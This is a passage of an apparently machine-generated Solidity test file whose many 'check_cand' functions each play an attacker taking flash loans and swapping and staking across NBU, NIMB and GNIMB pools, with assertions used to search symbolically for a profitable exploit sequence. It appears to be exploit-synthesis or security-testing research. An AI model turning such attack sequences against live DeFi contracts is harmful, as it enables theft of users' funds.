        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3928(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3929(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3930(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3931(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3932(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3933(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3934(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3935(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3936(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3937(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3938(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3939(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3940(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3941(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3942(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3943(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3944(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3945(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3946(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3947(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3948(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3949(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3950(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3951(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3952(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3953(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3954(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3955(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3956(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3957(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3958(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3959(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3960(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3961(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3962(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3963(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3964(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3965(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3966(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3967(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3968(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3969(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3970(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3971(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3972(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3973(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
